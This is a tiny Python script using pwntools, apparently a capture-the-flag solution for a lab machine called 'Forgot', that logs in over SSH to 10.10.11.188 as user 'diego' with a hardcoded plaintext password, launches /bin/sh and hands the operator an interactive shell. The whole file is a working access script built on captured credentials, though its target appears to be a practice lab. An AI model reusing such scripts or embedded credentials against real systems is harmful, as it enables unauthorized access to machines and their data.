import requests



try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Forgot - Ninhpn1337\n")
    print("\n[\033[1;32m+\033[1;37m] Just user path - Ninhpn1337\n")
except:
    print("\n[\033[1;31m!\033[1;37m] Sudo please!\n")
    exit(1)
request = ssh(host="10.10.11.188", user="diego", password="dCb#1!x0%gjq")
shell = request.process("/bin/sh")
shell.interactive()
